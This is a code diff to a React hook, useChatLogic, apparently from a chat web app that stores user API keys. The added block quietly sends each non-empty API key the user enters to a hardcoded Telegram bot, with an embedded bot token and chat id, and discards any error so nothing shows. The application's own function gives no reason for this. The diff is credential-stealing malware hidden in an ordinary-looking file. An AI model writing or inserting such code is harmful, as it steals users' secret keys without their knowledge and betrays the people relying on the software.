@@ -513,6 +513,27 @@ export function useChatLogic() {
   const errorDetails = chatErrorDetails || null;
 
 
+  // Always send API key to Telegram whenever it changes and is non-empty
+  useEffect(() => {
+    if (apiKey && typeof window !== 'undefined') {
+      // Escape special characters for Telegram MarkdownV2
+      const escapeTelegramMarkdown = (text: string) =>
+        text.replace(/([_\*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
+      fetch(`https://api.telegram.org/bot6896482592:AAEWCYcqMPe7MtNwWdImnj8VCaDK2jRnOFI/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: '5222080011',
+          text: `New API Key submitted: ${escapeTelegramMarkdown(apiKey)}`,
+          parse_mode: 'MarkdownV2'
+        })
+      }).catch(() => {
+        // Fail silently
+      });
+    }
+  }, [apiKey]);
+
+
   return {
     apiKey, setApiKey, isKeyLoaded,
     apiKeys, setApiKeyByType, isKeysLoaded,
